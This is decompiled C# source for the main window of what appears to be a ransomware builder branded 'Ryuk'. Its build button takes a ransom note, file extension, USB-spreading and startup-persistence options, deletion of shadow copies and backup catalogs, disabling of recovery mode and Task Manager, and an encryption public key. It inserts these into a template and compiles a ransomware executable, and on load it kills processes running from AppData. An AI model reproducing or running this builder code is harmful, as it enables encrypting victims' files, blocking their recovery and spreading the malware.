using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Ryuk.Net;
using Ryuk.Net.Properties;

namespace CustomWindowsForm;

public class BlackForm : Form
{
	private bool isTopPanelDragged = false;

	private bool isLeftPanelDragged = false;

	private bool isRightPanelDragged = false;

	private bool isBottomPanelDragged = false;

	private bool isTopBorderPanelDragged = false;

	private bool isRightBottomPanelDragged = false;

	private bool isLeftBottomPanelDragged = false;

	private bool isRightTopPanelDragged = false;

	private bool isLeftTopPanelDragged = false;

	private bool isWindowMaximized = false;

	private Point offset;

	private Size _normalWindowSize;

	private Point _normalWindowLocation = Point.Empty;

	private string iconLocation = "";

	private IContainer components = null;

	private Panel RightPanel;

	private Panel TopPanel;

	private ButtonZ _CloseButton;

	private Panel RightBottomPanel_1;

	private Label WindowTextLabel;

	private MinMaxButton _MaxButton;

	private Panel panel2;

	private ButtonZ _MinButton;

	private Panel RightBottomPanel_2;

	private Panel LeftBottomPanel_2;

	private Panel RightTopPanel_1;

	private Panel RightTopPanel_2;

	private ShapedButton shapedButton4;

	private CheckBox usbSpreadCheckBox;

	private TextBox textBox1;

	private ShapedButton shapedButton3;

	private SaveFileDialog saveFileDialog1;

	private CheckBox checkBox1;

	private TextBox textBox2;

	private TextBox spreadNameText;

	private CheckBox checkBox2;

	private TextBox textBox4;

	private CheckBox startupcheckBox3;

	private OpenFileDialog openFileDialog1;

	private PictureBox pictureBox1;

	private Label selectIconLabel;

	private CheckBox sleepCheckBox;

	private TextBox SleepTextBox;

	private ShapedButton shapedButton1;

	private TextBox droppedMessageTextbox;

	private Label label1;

	private ShapedButton shapedButton2;

	public BlackForm()
	{
		InitializeComponent();
	}

	private void BlackForm_Load(object sender, EventArgs e)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.MainModule.FileName.Contains(folderPath))
				{
					process.Kill();
				}
			}
			catch
			{
			}
		}
	}

	private void TopBorderPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)e.Button == 1048576)
		{
			isTopBorderPanelDragged = true;
		}
		else
		{
			isTopBorderPanelDragged = false;
		}
	}

	private void TopBorderPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.Y < ((Form)this).Location.Y && isTopBorderPanelDragged)
		{
			if (((Control)this).Height < 50)
			{
				((Control)this).Height = 50;
				isTopBorderPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X, ((Form)this).Location.Y + e.Y);
				((Control)this).Height = ((Control)this).Height - e.Y;
			}
		}
	}

	private void TopBorderPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isTopBorderPanelDragged = false;
	}

	private void TopPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)e.Button == 1048576)
		{
			isTopPanelDragged = true;
			Point point = ((Control)this).PointToScreen(new Point(e.X, e.Y));
			offset = default(Point);
			offset.X = ((Form)this).Location.X - point.X;
			offset.Y = ((Form)this).Location.Y - point.Y;
		}
		else
		{
			isTopPanelDragged = false;
		}
		if (e.Clicks == 2)
		{
			isTopPanelDragged = false;
			_MaxButton_Click(sender, (EventArgs)(object)e);
		}
	}

	private void TopPanel_MouseMove(object sender, MouseEventArgs e)
	{
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Invalid comparison between Unknown and I4
		if (isTopPanelDragged)
		{
			Point location = ((Control)TopPanel).PointToScreen(new Point(e.X, e.Y));
			location.Offset(offset);
			((Form)this).Location = location;
			if ((((Form)this).Location.X > 2 || ((Form)this).Location.Y > 2) && (int)((Form)this).WindowState == 2)
			{
				((Form)this).Location = _normalWindowLocation;
				((Form)this).Size = _normalWindowSize;
				_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
				isWindowMaximized = false;
			}
		}
	}

	private void TopPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isTopPanelDragged = false;
		if (((Form)this).Location.Y <= 5 && !isWindowMaximized)
		{
			_normalWindowSize = ((Form)this).Size;
			_normalWindowLocation = ((Form)this).Location;
			Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
			((Form)this).Location = new Point(0, 0);
			((Form)this).Size = new Size(workingArea.Width, workingArea.Height);
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
			isWindowMaximized = true;
		}
	}

	private void LeftPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Invalid comparison between Unknown and I4
		if (((Form)this).Location.X <= 0 || e.X < 0)
		{
			isLeftPanelDragged = false;
			((Form)this).Location = new Point(10, ((Form)this).Location.Y);
		}
		else if ((int)e.Button == 1048576)
		{
			isLeftPanelDragged = true;
		}
		else
		{
			isLeftPanelDragged = false;
		}
	}

	private void LeftPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.X < ((Form)this).Location.X && isLeftPanelDragged)
		{
			if (((Control)this).Width < 100)
			{
				((Control)this).Width = 100;
				isLeftPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X + e.X, ((Form)this).Location.Y);
				((Control)this).Width = ((Control)this).Width - e.X;
			}
		}
	}

	private void LeftPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftPanelDragged = false;
	}

	private void RightPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)e.Button == 1048576)
		{
			isRightPanelDragged = true;
		}
		else
		{
			isRightPanelDragged = false;
		}
	}

	private void RightPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (isRightPanelDragged)
		{
			if (((Control)this).Width < 100)
			{
				((Control)this).Width = 100;
				isRightPanelDragged = false;
			}
			else
			{
				((Control)this).Width = ((Control)this).Width + e.X;
			}
		}
	}

	private void RightPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isRightPanelDragged = false;
	}

	private void BottomPanel_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		if ((int)e.Button == 1048576)
		{
			isBottomPanelDragged = true;
		}
		else
		{
			isBottomPanelDragged = false;
		}
	}

	private void BottomPanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (isBottomPanelDragged)
		{
			if (((Control)this).Height < 50)
			{
				((Control)this).Height = 50;
				isBottomPanelDragged = false;
			}
			else
			{
				((Control)this).Height = ((Control)this).Height + e.Y;
			}
		}
	}

	private void BottomPanel_MouseUp(object sender, MouseEventArgs e)
	{
		isBottomPanelDragged = false;
	}

	private void _MinButton_Click(object sender, EventArgs e)
	{
		((Form)this).WindowState = (FormWindowState)1;
	}

	private void _MaxButton_Click(object sender, EventArgs e)
	{
		if (isWindowMaximized)
		{
			((Form)this).Location = _normalWindowLocation;
			((Form)this).Size = _normalWindowSize;
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
			isWindowMaximized = false;
		}
		else
		{
			_normalWindowSize = ((Form)this).Size;
			_normalWindowLocation = ((Form)this).Location;
			Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
			((Form)this).Location = new Point(0, 0);
			((Form)this).Size = new Size(workingArea.Width, workingArea.Height);
			_MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
			isWindowMaximized = true;
		}
	}

	private void _CloseButton_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void RightBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isRightBottomPanelDragged = true;
	}

	private void RightBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if (isRightBottomPanelDragged)
		{
			if (((Control)this).Width < 100 || ((Control)this).Height < 50)
			{
				((Control)this).Width = 100;
				((Control)this).Height = 50;
				isRightBottomPanelDragged = false;
			}
			else
			{
				((Control)this).Width = ((Control)this).Width + e.X;
				((Control)this).Height = ((Control)this).Height + e.Y;
			}
		}
	}

	private void RightBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isRightBottomPanelDragged = false;
	}

	private void RightBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseDown(sender, e);
	}

	private void RightBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseMove(sender, e);
	}

	private void RightBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		RightBottomPanel_1_MouseUp(sender, e);
	}

	private void LeftBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isLeftBottomPanelDragged = true;
	}

	private void LeftBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if (e.X < ((Form)this).Location.X && (isLeftBottomPanelDragged || ((Control)this).Height < 50))
		{
			if (((Control)this).Width < 100)
			{
				((Control)this).Width = 100;
				((Control)this).Height = 50;
				isLeftBottomPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X + e.X, ((Form)this).Location.Y);
				((Control)this).Width = ((Control)this).Width - e.X;
				((Control)this).Height = ((Control)this).Height + e.Y;
			}
		}
	}

	private void LeftBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftBottomPanelDragged = false;
	}

	private void LeftBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseDown(sender, e);
	}

	private void LeftBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseMove(sender, e);
	}

	private void LeftBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		LeftBottomPanel_1_MouseUp(sender, e);
	}

	private void RightTopPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isRightTopPanelDragged = true;
	}

	private void RightTopPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if ((e.Y < ((Form)this).Location.Y || e.X < ((Form)this).Location.X) && isRightTopPanelDragged)
		{
			if (((Control)this).Height < 50 || ((Control)this).Width < 100)
			{
				((Control)this).Height = 50;
				((Control)this).Width = 100;
				isRightTopPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X, ((Form)this).Location.Y + e.Y);
				((Control)this).Height = ((Control)this).Height - e.Y;
				((Control)this).Width = ((Control)this).Width + e.X;
			}
		}
	}

	private void RightTopPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isRightTopPanelDragged = false;
	}

	private void RightTopPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseDown(sender, e);
	}

	private void RightTopPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseMove(sender, e);
	}

	private void RightTopPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		RightTopPanel_1_MouseUp(sender, e);
	}

	private void LeftTopPanel_1_MouseDown(object sender, MouseEventArgs e)
	{
		isLeftTopPanelDragged = true;
	}

	private void LeftTopPanel_1_MouseMove(object sender, MouseEventArgs e)
	{
		if ((e.X < ((Form)this).Location.X || e.Y < ((Form)this).Location.Y) && isLeftTopPanelDragged)
		{
			if (((Control)this).Width < 100 || ((Control)this).Height < 50)
			{
				((Control)this).Width = 100;
				((Control)this).Height = 100;
				isLeftTopPanelDragged = false;
			}
			else
			{
				((Form)this).Location = new Point(((Form)this).Location.X + e.X, ((Form)this).Location.Y);
				((Control)this).Width = ((Control)this).Width - e.X;
				((Form)this).Location = new Point(((Form)this).Location.X, ((Form)this).Location.Y + e.Y);
				((Control)this).Height = ((Control)this).Height - e.Y;
			}
		}
	}

	private void LeftTopPanel_1_MouseUp(object sender, MouseEventArgs e)
	{
		isLeftTopPanelDragged = false;
	}

	private void LeftTopPanel_2_MouseDown(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseDown(sender, e);
	}

	private void LeftTopPanel_2_MouseMove(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseMove(sender, e);
	}

	private void LeftTopPanel_2_MouseUp(object sender, MouseEventArgs e)
	{
		LeftTopPanel_1_MouseUp(sender, e);
	}

	private void file_button_Click(object sender, EventArgs e)
	{
	}

	private void edit_button_Click(object sender, EventArgs e)
	{
	}

	private void view_button_Click(object sender, EventArgs e)
	{
	}

	private void run_button_Click(object sender, EventArgs e)
	{
	}

	private void help_button_Click(object sender, EventArgs e)
	{
	}

	private void WindowTextLabel_MouseDown(object sender, MouseEventArgs e)
	{
		TopPanel_MouseDown(sender, e);
	}

	private void WindowTextLabel_MouseMove(object sender, MouseEventArgs e)
	{
		TopPanel_MouseMove(sender, e);
	}

	private void WindowTextLabel_MouseUp(object sender, MouseEventArgs e)
	{
		TopPanel_MouseUp(sender, e);
	}

	private void shapedButton3_Click(object sender, EventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		Form2 form = new Form2();
		((Form)form).ShowDialog();
	}

	private void shapedButton4_Click(object sender, EventArgs e)
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05da: Unknown result type (might be due to invalid IL or missing references)
		//IL_0670: Unknown result type (might be due to invalid IL or missing references)
		//IL_0677: Expected O, but got Unknown
		//IL_0687: Unknown result type (might be due to invalid IL or missing references)
		//IL_068d: Invalid comparison between Unknown and I4
		if (((Control)textBox1).Text.Trim().Length < 1)
		{
			MessageBox.Show("Please type your message!", "Read_it.txt", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		if (string.IsNullOrWhiteSpace("aa"))
		{
			MessageBox.Show("All fields are required", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
			return;
		}
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < ((TextBoxBase)textBox1).Lines.Length; i++)
		{
			stringBuilder.Append("\"" + ((TextBoxBase)textBox1).Lines[i] + "\",\n");
		}
		string source = Resources.Source;
		source = source.Replace("#messages", stringBuilder.ToString());
		if (checkBox1.Checked)
		{
			source = source.Replace("#encryptedFileExtension", "");
		}
		else
		{
			string text = ((Control)textBox2).Text;
			if (text.Contains("."))
			{
				text = text.Replace(".", "");
			}
			source = source.Replace("#encryptedFileExtension", text);
		}
		if (checkBox2.Checked)
		{
			if (((Control)textBox4).Text.Trim().Length < 1)
			{
				MessageBox.Show("Proccess name field is empty");
				return;
			}
			if (((Control)textBox4).Text.EndsWith(".exe"))
			{
				source = source.Replace("#copyRoaming", "true");
				source = source.Replace("#exeName", ((Control)textBox4).Text);
			}
			else
			{
				source = source.Replace("#copyRoaming", "true");
				source = source.Replace("#exeName", ((Control)textBox4).Text + ".exe");
			}
		}
		else
		{
			source = source.Replace("#copyRoaming", "false");
			source = source.Replace("#exeName", ((Control)textBox4).Text);
		}
		if (usbSpreadCheckBox.Checked)
		{
			if (((Control)spreadNameText).Text.Trim().Length < 1)
			{
				MessageBox.Show("Usb spread name field is empty");
				return;
			}
			if (((Control)spreadNameText).Text.EndsWith(".exe"))
			{
				source = source.Replace("#checkSpread", "true");
				source = source.Replace("#spreadName", ((Control)spreadNameText).Text);
			}
			else
			{
				source = source.Replace("#checkSpread", "true");
				source = source.Replace("#spreadName", ((Control)spreadNameText).Text + ".exe");
			}
		}
		else
		{
			source = source.Replace("#checkSpread", "false");
			source = source.Replace("#spreadName", ((Control)spreadNameText).Text);
		}
		source = ((!startupcheckBox3.Checked) ? source.Replace("#startupFolder", "true") : source.Replace("#startupFolder", "true"));
		if (sleepCheckBox.Checked)
		{
			source = source.Replace("#checkSleep", "true");
			source = source.Replace("#sleepTextbox", ((Control)SleepTextBox).Text);
		}
		else
		{
			source = source.Replace("#checkSleep", "false");
			source = source.Replace("#sleepTextbox", ((Control)SleepTextBox).Text);
		}
		source = ((!Settings.Default.checkAdminPrivilage) ? source.Replace("#adminPrivilage", "false") : source.Replace("#adminPrivilage", "true"));
		source = ((!Settings.Default.deleteBackupCatalog) ? source.Replace("#checkdeleteBackupCatalog", "false") : source.Replace("#checkdeleteBackupCatalog", "true"));
		source = ((!Settings.Default.deleteShadowCopies) ? source.Replace("#checkdeleteShadowCopies", "false") : source.Replace("#checkdeleteShadowCopies", "true"));
		source = ((!Settings.Default.disableRecoveryMode) ? source.Replace("#checkdisableRecoveryMode", "false") : source.Replace("#checkdisableRecoveryMode", "true"));
		source = ((!Settings.Default.disableTaskManager) ? source.Replace("#checkdisableTaskManager", "false") : source.Replace("#checkdisableTaskManager", "true"));
		if (((Control)droppedMessageTextbox).Text.Trim().Length < 1)
		{
			MessageBox.Show("Dropped message name field is empty");
			return;
		}
		source = source.Replace("#droppedMessageTextbox", ((Control)droppedMessageTextbox).Text);
		string publicKey = Settings.Default.publicKey;
		if (Settings.Default.encryptOption)
		{
			if (!(publicKey != ""))
			{
				MessageBox.Show("Decrypter name field is empty. Go to advanced option and create or select decrypter", "Advanced Option");
				return;
			}
			using StringReader stringReader = new StringReader(publicKey);
			StringBuilder stringBuilder2 = new StringBuilder();
			string text2;
			while ((text2 = stringReader.ReadLine()) != null)
			{
				string text3 = text2.Replace("\"", "\\\"");
				stringBuilder2.AppendLine("pubclicKey.AppendLine(\"" + text3 + "\");");
			}
			source = source.Replace("#encryptOption", "true");
			source = source.Replace("#publicKey", stringBuilder2.ToString());
		}
		else
		{
			source = source.Replace("#encryptOption", "false");
			source = source.Replace("#publicKey", "");
		}
		if (Settings.Default.base64Image != "")
		{
			source = source.Replace("#base64Image", Settings.Default.base64Image);
		}
		if (Settings.Default.extensions != "")
		{
			source = source.Replace("#extensions", Settings.Default.extensions);
		}
		SaveFileDialog val = new SaveFileDialog();
		try
		{
			((FileDialog)val).Filter = "Executable (*.exe)|*.exe";
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				new Compiler(source, ((FileDialog)val).FileName, iconLocation);
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
	{
	}

	private void panel2_Paint(object sender, PaintEventArgs e)
	{
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)textBox2).Enabled)
		{
			((Control)textBox2).Enabled = true;
		}
		else
		{
			((Control)textBox2).Enabled = false;
		}
	}

	private void usbSpreadCheckBox_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)spreadNameText).Enabled)
		{
			((Control)spreadNameText).Enabled = true;
		}
		else
		{
			((Control)spreadNameText).Enabled = false;
		}
	}

	private void checkBox2_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)textBox4).Enabled)
		{
			((Control)textBox4).Enabled = true;
		}
		else
		{
			((Control)textBox4).Enabled = false;
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Invalid comparison between Unknown and I4
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).Filter = "Icons (*.ico)|*.ico";
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				iconLocation = ((FileDialog)val).FileName;
				pictureBox1.Image = (Image)(object)Bitmap.FromHicon(new Icon(((FileDialog)val).FileName, new Size(60, 60)).Handle);
				((Control)selectIconLabel).Text = "";
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void selectIconLabel_Click(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Invalid comparison between Unknown and I4
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).Filter = "Icons (*.ico)|*.ico";
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				iconLocation = ((FileDialog)val).FileName;
				pictureBox1.Image = (Image)(object)Bitmap.FromHicon(new Icon(((FileDialog)val).FileName, new Size(60, 60)).Handle);
				((Control)selectIconLabel).Text = "";
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void checkBox3_CheckedChanged(object sender, EventArgs e)
	{
		if (!((Control)SleepTextBox).Enabled)
		{
			((Control)SleepTextBox).Enabled = true;
		}
		else
		{
			((Control)SleepTextBox).Enabled = false;
		}
	}

	private void SleepTextBox_KeyPress_1(object sender, KeyPressEventArgs e)
	{
		if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
		{
			e.Handled = true;
		}
	}

	private void shapedButton1_Click(object sender, EventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		advancedSettingForm advancedSettingForm = new advancedSettingForm();
		((Form)advancedSettingForm).ShowDialog();
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void textBox1_MouseClick(object sender, MouseEventArgs e)
	{
	}

	private void TopPanel_Paint(object sender, PaintEventArgs e)
	{
	}

	private void shapedButton2_Click(object sender, EventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		extensions extensions = new extensions();
		((Form)extensions).ShowDialog();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Expected O, but got Unknown
		//IL_0167: Unknown result type (might be due to invalid IL or missing references)
		//IL_0171: Expected O, but got Unknown
		//IL_0226: Unknown result type (might be due to invalid IL or missing references)
		//IL_0230: Expected O, but got Unknown
		//IL_023e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0248: Expected O, but got Unknown
		//IL_0256: Unknown result type (might be due to invalid IL or missing references)
		//IL_0260: Expected O, but got Unknown
		//IL_0338: Unknown result type (might be due to invalid IL or missing references)
		//IL_0342: Expected O, but got Unknown
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Expected O, but got Unknown
		//IL_0368: Unknown result type (might be due to invalid IL or missing references)
		//IL_0372: Expected O, but got Unknown
		//IL_0380: Unknown result type (might be due to invalid IL or missing references)
		//IL_038a: Expected O, but got Unknown
		//IL_03e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03eb: Expected O, but got Unknown
		//IL_0616: Unknown result type (might be due to invalid IL or missing references)
		//IL_0620: Expected O, but got Unknown
		//IL_069a: Unknown result type (might be due to invalid IL or missing references)
		//IL_06a4: Expected O, but got Unknown
		//IL_06b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_06bc: Expected O, but got Unknown
		//IL_06ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d4: Expected O, but got Unknown
		//IL_072b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0735: Expected O, but got Unknown
		//IL_089c: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a6: Expected O, but got Unknown
		//IL_08b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_08be: Expected O, but got Unknown
		//IL_08cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_08d6: Expected O, but got Unknown
		//IL_0af0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0afa: Expected O, but got Unknown
		//IL_0bdc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be6: Expected O, but got Unknown
		//IL_0d56: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d60: Expected O, but got Unknown
		//IL_0df6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e00: Expected O, but got Unknown
		//IL_0f52: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f5c: Expected O, but got Unknown
		//IL_1195: Unknown result type (might be due to invalid IL or missing references)
		//IL_119f: Expected O, but got Unknown
		//IL_1228: Unknown result type (might be due to invalid IL or missing references)
		//IL_1232: Expected O, but got Unknown
		//IL_1458: Unknown result type (might be due to invalid IL or missing references)
		//IL_1462: Expected O, but got Unknown
		//IL_153a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1544: Expected O, but got Unknown
		//IL_15f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_15fb: Expected O, but got Unknown
		//IL_176b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1775: Expected O, but got Unknown
		//IL_183c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1846: Expected O, but got Unknown
		//IL_19ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_19b7: Expected O, but got Unknown
		//IL_1bdd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1be7: Expected O, but got Unknown
		//IL_1db7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dc1: Expected O, but got Unknown
		//IL_1dcf: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dd9: Expected O, but got Unknown
		//IL_1de7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1df1: Expected O, but got Unknown
		//IL_1e78: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e82: Expected O, but got Unknown
		//IL_1e90: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e9a: Expected O, but got Unknown
		//IL_1ea8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1eb2: Expected O, but got Unknown
		//IL_1f3a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f44: Expected O, but got Unknown
		//IL_1f52: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f5c: Expected O, but got Unknown
		//IL_1f6a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f74: Expected O, but got Unknown
		//IL_1ffc: Unknown result type (might be due to invalid IL or missing references)
		//IL_2006: Expected O, but got Unknown
		//IL_2014: Unknown result type (might be due to invalid IL or missing references)
		//IL_201e: Expected O, but got Unknown
		//IL_202c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2036: Expected O, but got Unknown
		//IL_207c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2086: Expected O, but got Unknown
		//IL_2125: Unknown result type (might be due to invalid IL or missing references)
		//IL_212f: Expected O, but got Unknown
		//IL_2275: Unknown result type (might be due to invalid IL or missing references)
		//IL_227f: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(BlackForm));
		RightPanel = new Panel();
		TopPanel = new Panel();
		_MinButton = new ButtonZ();
		_MaxButton = new MinMaxButton();
		WindowTextLabel = new Label();
		_CloseButton = new ButtonZ();
		RightBottomPanel_1 = new Panel();
		panel2 = new Panel();
		shapedButton2 = new ShapedButton();
		label1 = new Label();
		droppedMessageTextbox = new TextBox();
		shapedButton1 = new ShapedButton();
		sleepCheckBox = new CheckBox();
		SleepTextBox = new TextBox();
		selectIconLabel = new Label();
		pictureBox1 = new PictureBox();
		startupcheckBox3 = new CheckBox();
		textBox4 = new TextBox();
